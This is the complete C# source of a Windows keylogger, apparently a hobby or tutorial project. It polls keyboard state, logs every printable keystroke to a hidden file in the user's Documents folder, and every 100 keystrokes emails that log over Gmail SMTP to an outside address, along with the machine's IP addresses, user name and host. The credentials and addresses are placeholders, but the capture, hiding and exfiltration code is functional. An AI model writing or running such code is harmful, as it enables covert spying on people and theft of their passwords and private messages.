using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace Keylogger
{
    class Program
    {
     /*-------------------------------------------------------------------------------------------------------------------*/
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static long numberofkeytrokes =0;
        static void Main(string[] args)
        {
            //Store the keystrokes to a text file

            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if(!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }
            string path = (filepath + @"\keystrokes.txt");
            if(!File.Exists(path))
            {
                using (StreamWriter sw=File.CreateText(path))
                {
                }
            }
            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
            /*-------------------------------------------------------------------------------------------------------------------*/
           
            // Capture keystrokes and display them to the console
            while (true)
            {
                Thread.Sleep(5);
                //Check all of the keys for their state

                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if(keyState == 32769)
                    {
                        Console.Write((char)i + ", ");
                        using (StreamWriter sw=File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }
                        
                        numberofkeytrokes++;
                        //This is where we can set the limit before sending the message
                        if(numberofkeytrokes % 100==0)
                        {
                             sendmesssage();
                        }
                    }
                   
                }
            }
           
        }
        /*-------------------------------------------------------------------------------------------------------------------*/
        //Send the contents of the text file to an external email address.
        static void sendmesssage()
        {
            string foldername = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filepath = foldername + @"\keystrokes.txt";
            string logContents = File.ReadAllText(filepath);
            string emailbody = "";

            //creating email message
            
            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach(var address in host.AddressList)
            {
                emailbody += "Address: " + address;
            }
            emailbody += "\n User: " + Environment.UserDomainName + "\\" + Environment.UserName;
            emailbody += "\nhost " + host;
            emailbody += "\ntime: " + now.ToString();
            emailbody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailmessage = new MailMessage();
            mailmessage.From = new MailAddress("this where the mail is coming from later on like: example@gmail.com");
            mailmessage.To.Add("this is where the mail is going to, in our case it is going to be example.com aswell");
            mailmessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("example@gmail.com", "example123");   //this is our credentials
            mailmessage.Body = emailbody;
            client.Send(mailmessage);
        }
        /*-------------------------------------------------------------------------------------------------------------------*/

    }
}
